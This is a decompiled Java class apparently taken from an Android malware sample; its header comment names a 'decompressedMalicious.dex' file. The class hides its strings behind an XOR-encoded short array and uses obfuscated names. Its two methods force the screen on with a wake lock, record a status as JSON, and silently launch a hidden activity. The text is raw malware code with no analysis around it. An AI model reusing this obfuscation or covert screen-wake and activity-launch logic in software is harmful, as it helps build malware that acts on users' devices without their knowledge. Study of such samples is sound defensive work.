package com.zjxyxnvvp.nxvxchltf.i;

import android.content.Context;
import android.content.Intent;
import android.os.PowerManager;
import com.zjxyxnvvp.nxvxchltf.d;
import com.zjxyxnvvp.nxvxchltf.e;
import com.zjxyxnvvp.nxvxchltf.util.AUInawiOBFA;
import com.zjxyxnvvp.nxvxchltf.util.h;
import org.json.JSONException;
import org.json.JSONObject;
/* loaded from: /home/remnux/decompressedMalicious.dex */
public class a {
    private static short[] $ = {1303, 1301, 1282, 1311, 1280, 1303, 1282, 1299, 1321, 1285, 1301, 1284, 1299, 1299, 1304, 7824, 7823, 7831, 7813, 7826, 2762, 2781, 2763, 2765, 2772, 2764, 9401, 9362, 9373, 9374, 9360, 9369, 9368, 9436, 9359, 9375, 9358, 9369, 9369, 9362, 9436, 9354, 9422, 9713, 9690, 9680, 9688, 9681, 9671, 9671, 9703, 9681, 9670, 9666, 9693, 9687, 9681, 9614, 9614, 9667, 9685, 9695, 9681, 9689, 9681, 9195, 9204, 9196, 9214, 9193, 6269, 6250, 6268, 6266, 6243, 6267, 6953, 6914, 6925, 6926, 6912, 6921, 6920, 6988, 6943, 6927, 6942, 6921, 6921, 6914, 6988, 6938, 7006, 1318, 1293, 1287, 1295, 1286, 1296, 1296, 1328, 1286, 1297, 1301, 1290, 1280, 1286, 1369, 1369, 1300, 1282, 1288, 1286, 1294, 1286};

    private static String $(int i, int i2, int i3) {
        char[] cArr = new char[i2 - i];
        for (int i4 = 0; i4 < i2 - i; i4++) {
            cArr[i4] = (char) ($[i + i4] ^ i3);
        }
        return new String(cArr);
    }

    public static void a(Context context) {
        d dVar = d.e;
        p pVar = dVar.c;
        String $2 = $(0, 15, 1398);
        f b2 = pVar.b($2);
        PowerManager powerManager = (PowerManager) context.getSystemService($(15, 20, 7904));
        if (b2 != null) {
            JSONObject jSONObject = new JSONObject();
            try {
                jSONObject.put($(20, 26, 2744), $(26, 43, 9468));
            } catch (JSONException e) {
                e.printStackTrace();
            }
            dVar.c.e($2, jSONObject);
            h.c = true;
            context.startActivity(new Intent(context, AUInawiOBFA.class).addFlags(268435456));
            powerManager.newWakeLock(268435466, $(43, 65, 9652)).acquire(7000);
        }
    }

    public static void b(Context context) {
        d dVar = d.e;
        PowerManager powerManager = (PowerManager) context.getSystemService($(65, 70, 9115));
        if (e.m.getAndSet(false)) {
            try {
                new JSONObject().put($(70, 76, 6159), $(76, 93, 7020));
            } catch (JSONException e) {
                e.printStackTrace();
            }
            h.c = true;
            context.startActivity(new Intent(context, AUInawiOBFA.class).addFlags(268435456));
            powerManager.newWakeLock(268435466, $(93, 115, 1379)).acquire(7000);
        }
    }
}
